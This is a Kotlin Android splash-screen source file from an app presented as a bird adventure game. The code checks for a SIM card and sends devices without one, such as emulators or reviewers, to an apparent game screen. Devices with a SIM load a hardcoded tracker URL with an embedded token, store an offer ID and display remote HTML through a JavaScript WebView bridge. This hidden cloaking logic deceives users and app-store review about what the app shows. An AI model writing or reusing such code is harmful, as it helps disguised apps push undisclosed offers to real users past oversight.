package com.bird.adventure.fly

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log
import android.view.View
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.LinearLayout
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject


@SuppressLint("CustomSplashScreen")
class SplashScreen : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash_screen)

        val connect_info: LinearLayout = findViewById(R.id.connect_info)
        val splash_screen: LinearLayout = findViewById(R.id.splash_screen)

        val timer = object : CountDownTimer(1000, 500) {
            override fun onTick(millisUntilFinished: Long) {

            }

            override fun onFinish() {

                var result = true
                try {
                    val telMgr = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                    val simState = telMgr.simState
                    when (simState) {
                        TelephonyManager.SIM_STATE_ABSENT -> result = false
                        TelephonyManager.SIM_STATE_UNKNOWN -> result = false
                        else -> {
                        }
                    }
                } catch (e: Exception) {
                    //ignore
                }

                val sim = result

                if (isWorkingInternetPersent()) {
                    if (sim) {
                        splash();
                    } else {
                        val i = Intent(applicationContext, ActivityLoader::class.java)
                        startActivity(i)
                        finish()
                    }

                } else {
                    if (!sim) {
                        splash_screen.visibility = View.GONE
                        connect_info.visibility = View.VISIBLE
                        this.start()
                    } else {
                        splash_screen.visibility = View.GONE
                        connect_info.visibility = View.VISIBLE
                        this.start()
                    }

                }
            }

        }
        timer.start()
    }

    fun isWorkingInternetPersent(): Boolean {
        val connectivityManager = baseContext
            .getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val info = connectivityManager.allNetworkInfo
        for (i in info.indices) if (info[i].state == NetworkInfo.State.CONNECTED) {
            return true
        }
        return false
    }

    fun splash() {
        val timerTread: Thread = object : Thread() {
            override fun run() {
                try {
                    sleep(100)
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                } finally {

                    val connect_info: LinearLayout = findViewById(R.id.connect_info)
                    val splash_screen: LinearLayout = findViewById(R.id.splash_screen)
                    splash_screen.animate().setDuration(2100).alpha(1f).withEndAction {

                        var web: WebView = findViewById(R.id.web_api)

                        web.webViewClient = object :
                            WebViewClient() {
                            override fun onPageFinished(view: WebView, url: String) {
                                web.loadUrl("javascript:window.HTMLOUT.processHTML(document.getElementsByTagName('pre')[0].innerHTML);")
                            }
                        }

                        web.settings.javaScriptEnabled = true
                        web.canGoBack()
                        web.settings.loadsImagesAutomatically = true
                        //добавление кэша и куки
                        web.settings.setAppCacheEnabled(false)
                        web.settings.databaseEnabled = true
                        web.settings.domStorageEnabled = true; // Открываем кеш DOM
                        web.settings.cacheMode = WebSettings.LOAD_DEFAULT

                        val html_polisy = getSharedPreferences(packageName, MODE_PRIVATE)
                        web.addJavascriptInterface(object {
                            @JavascriptInterface
                            fun processHTML(html: String?) {
                                val json1 = JSONObject(html!!)
                                var ans_00 = json1.getString("body").toString()
                                val json2 = JSONObject(json1.getString("info"))
                                val ans_3: String = json2.getString("token")
                                val ans_4: String = json2.getString("offer_id")

                                Log.d("log", "token: " + ans_3)
                                Log.d("log", "offer_id: " + ans_4)
                                html_polisy.edit().putString("token", ans_3).apply()
                                html_polisy.edit().putString("offer_id", ans_4).apply()

                                Handler(Looper.getMainLooper()).post {
                                    ans_00 = ans_00.replace("&lt;", "<").replace("&gt;", ">")
                                    val i = Intent(applicationContext, MainActivityWeb::class.java)
                                    i.putExtra("polisy", ans_00)
                                    startActivity(i)
                                    finish()
                                }

                            }
                        }, "HTMLOUT")

                        val tracker = "https://pomidorkin.space/6gdcPRkt"
                        val token = "btFHzQz3CbqzcMZw"

                        val url_1 = "$tracker/click_api/v3?token=$token&log=1&info=1"

                        web.loadUrl(url_1)

                    }
                }
            }
        }
        timerTread.start()
    }

//    fun getUserAgent(context: Context): String {
//        var userAgent = ""
//        userAgent =
//            try {
//                WebSettings.getDefaultUserAgent(context)
//            } catch (e: Exception) {
//                System.getProperty("http.agent")!!
//            }
//        val sb = StringBuffer()
//        var i = 0
//        val length = userAgent.length
//        while (i < length) {
//            val c = userAgent[i]
//            if (c <= '\u001f' || c >= '\u007f') {
//                sb.append(String.format("\\u%04x", c.toInt()))
//            } else {
//                sb.append(c)
//            }
//            i++
//        }
//        return sb.toString()
//    }

}

